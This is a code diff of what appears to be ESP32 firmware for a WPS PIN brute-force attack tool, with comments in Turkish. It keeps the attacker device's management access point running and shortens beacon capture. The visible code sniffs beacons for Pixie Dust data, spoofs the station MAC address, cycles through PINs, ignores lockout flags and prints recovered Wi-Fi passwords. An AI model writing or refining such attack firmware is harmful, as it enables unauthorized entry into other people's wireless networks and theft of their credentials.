@@ -2759,13 +2759,13 @@ void wps_start_attack(int target_index) {
   apply_vendor_name(vendor);
 
   // ── Beacon IE yakalama: model/seri/Pixie Dust bilgisi al ─────────────────
-  // Promiscuous modda beacon'ı dinle — aynı kanal, bağlantısız, 5 saniye.
-  // (3000 → 5000: Bazı AP'ler WPS IE'yi seyrek gönderiyor — süre artırıldı)
-  // Seri numarası yakalanırsa PIN listesi önüne eklenir → hızlı sonuç.
-  // AP Setup Locked tespiti de burada yapılır (WPS kapalı uyarısı).
+  // Promiscuous modda beacon'ı dinle — aynı kanal, bağlantısız, 2.5 saniye.
+  // Süre kısaltıldı (5000→2500): Aktif tarama geri dönüşü kaldırıldığından
+  // uzun beklemeye gerek yok; beacon genellikle 100ms içinde gelir.
+  // Yakalanamazsa saldırı BSSID/OUI ile devam eder — sorun olmaz.
   DEBUG_PRINTLN("WPS: Beacon IE taraniyor (model/serial icin)...");
   wps_capture_device_info(wps_targets[target_index].bssid,
-                          wps_targets[target_index].channel, 5000);
+                          wps_targets[target_index].channel, 2500);
   if (wps_device_info.valid && wps_device_info.ap_setup_locked) {
     DEBUG_PRINTLN("WPS: AP_SETUP_LOCKED=1 tespit edildi! WPS kilitli.");
     // Kilitli olsa da devam et — bazı firmware yanlış rapor eder
@@ -2837,11 +2837,9 @@ void wps_start_attack(int target_index) {
   wps_adaptive_timeout = WPS_PIN_TIMEOUT_MS;
   wps_lockout_delay_ms = WPS_LOCKOUT_DELAY_MS;
 
-  WiFi.mode(WIFI_MODE_APSTA);
-  delay(50);
-  setCpuFrequencyMhz(160);
-  esp_wifi_set_max_tx_power(84);
-  esp_wifi_set_ps(WIFI_PS_NONE);
+  // Mod değişimi YOK — cihaz zaten APSTA modunda başlıyor (main.cpp setup).
+  // WiFi.mode(APSTA) çağırmak AP'yi yeniden başlatır ve yönetim ağını keser.
+  apply_max_performance();
 
   // Orijinal MAC'i kaydet, ilk MAC'i al
   esp_wifi_get_mac(WIFI_IF_STA, wps_original_mac);
@@ -2865,14 +2863,11 @@ void wps_stop() {
   wps_attack_state   = WPS_STOPPED;
   wps_current_pin[0] = '\0';
 
-  WiFi.mode(WIFI_MODE_AP);
-  WiFi.softAP(AP_SSID, AP_PASS);
-  delay(100);
-  setCpuFrequencyMhz(160);
-  esp_wifi_set_max_tx_power(84);
-  esp_wifi_set_ps(WIFI_PS_NONE);
+  // WIFI_MODE_AP'ye geçiş YOK — APSTA modunda kal, AP kesintisiz çalışır.
+  // STA arayüzü pasif kalır; AP "X" hiç kapanmaz.
+  apply_max_performance();
 
-  DEBUG_PRINTLN("WPS durduruldu, yonetim AP geri yuklendi.");
+  DEBUG_PRINTLN("WPS durduruldu, yonetim AP aktif.");
 }
 
 // ─── Ana döngü ────────────────────────────────────────────────────────────────
@@ -2903,12 +2898,8 @@ void wps_loop() {
   // ── Tüm PIN'ler tükendi ───────────────────────────────────────────────────
   if (wps_attempt >= wps_total) {
     wps_attack_state = WPS_EXHAUSTED;
-    WiFi.mode(WIFI_MODE_AP);
-    WiFi.softAP(AP_SSID, AP_PASS);
-    delay(100);
-    setCpuFrequencyMhz(160);
-    esp_wifi_set_max_tx_power(84);
-    esp_wifi_set_ps(WIFI_PS_NONE);
+    // Mod değişimi YOK — APSTA'da kal, AP kesintisiz çalışır.
+    apply_max_performance();
     // Orijinal MAC'i geri yükle
     if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
       esp_wifi_set_mac(WIFI_IF_STA, wps_original_mac);
@@ -2942,12 +2933,8 @@ void wps_loop() {
     led_on();
     DEBUG_PRINTF("WPS BASARILI! PIN: %s, SSID: %s, Pass: %s\n",
       wps_found_pin, wps_found_ssid, wps_found_pass);
-    WiFi.mode(WIFI_MODE_AP);
-    WiFi.softAP(AP_SSID, AP_PASS);
-    delay(100);
-    setCpuFrequencyMhz(160);
-    esp_wifi_set_max_tx_power(84);
-    esp_wifi_set_ps(WIFI_PS_NONE);
+    // Mod değişimi YOK — APSTA'da kal, AP kesintisiz çalışır.
+    apply_max_performance();
     if (wps_original_mac[0] != 0 || wps_original_mac[1] != 0)
       esp_wifi_set_mac(WIFI_IF_STA, wps_original_mac);
 
